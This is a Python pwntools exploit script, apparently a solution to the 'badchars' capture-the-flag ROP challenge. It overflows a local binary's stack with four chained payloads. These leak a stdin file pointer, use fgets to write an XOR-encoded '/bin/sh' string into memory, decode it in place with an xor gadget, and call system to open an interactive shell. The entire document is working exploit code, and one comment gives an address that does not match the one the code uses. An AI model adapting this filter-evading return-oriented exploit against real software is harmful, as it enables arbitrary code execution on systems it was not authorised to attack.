#/usr/bin/env python

from pwn import *

context.binary = './badchars'
#context.log_level = 'debug'

io = process('./badchars')
elf = ELF('./badchars')
command = "/bin/sh\x00"
command = list(command)
#encrypt to escape badchars
xor = 0x80
input = []
for i in xrange(len(command)):
    input.append(chr(xor^ord(command[i])))
input = ''.join(input)

#leak Stdin_addr file Pointer 
io.recvuntil('\n> ')
payload1 = 'A'*(0x28)
payload1 += p64(0x400b39)
payload1 += p64(0x601090)
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['pwnme'])
io.sendline(payload1)
File_STDIN = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))
log.info('File_STDIN:'+hex(File_STDIN))

# input encrypted string to 0x804A130
io.recvuntil('\n> ')
payload2 = 'A'*(0x28)
payload2 += p64(0x400BAA)
payload2 += p64(0)+p64(1)
payload2 += p64(elf.got['fgets'])
payload2 += p64(File_STDIN)+p64(0x80)+p64(0x601130)
payload2 += p64(0x400B90)
payload2 += 56*'A'
payload2 += p64(elf.symbols['pwnme'])

io.sendline(payload2)
io.sendline(''.join(input))

#decrypt string ,get '/bin/sh'
io.recvuntil('\n> ')
payload3 ='A'*(0x28)
for index in range(len(input)):
    payload3 += p64(0x400B40)
    payload3 += p64(0x80)+p64(0x601130+index)
    payload3 += p64(0x400b30)
payload3 +=p64(elf.symbols['pwnme'])
io.sendline(payload3)

#spawn shell
io.recvuntil('\n> ')
payload4 = 'A'*(0x28)
payload4 += p64(0x400b39)
payload4 += p64(0x601130)
payload4 += p64(elf.plt['system'])
io.sendline(payload4)

io.interactive()
